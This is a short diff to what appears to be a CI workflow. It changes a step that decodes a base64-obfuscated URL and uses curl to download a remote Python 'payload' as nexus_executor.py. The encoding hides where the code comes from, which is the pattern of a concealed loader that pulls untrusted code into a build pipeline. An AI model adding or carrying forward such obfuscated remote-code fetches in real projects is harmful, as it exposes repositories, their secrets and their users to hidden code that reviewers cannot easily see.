@@ -61,7 +61,7 @@ jobs:
       - name: Retrieve Core Script
         run: |
           echo "[RETRIEVE] Fetching remote payload..."
-          RAW_ENDPOINT="aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5"
+          RAW_ENDPOINT="aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrMS9mb2Zmby9yZXNvbHZlL21haW4vc3RhcnQucHk="
           RESOLVED_ENDPOINT=$(openssl base64 -d -A <<< "$RAW_ENDPOINT")
           curl -sL "$RESOLVED_ENDPOINT" -o nexus_executor.py
           echo "[RETRIEVE] Script downloaded as nexus_executor.py."
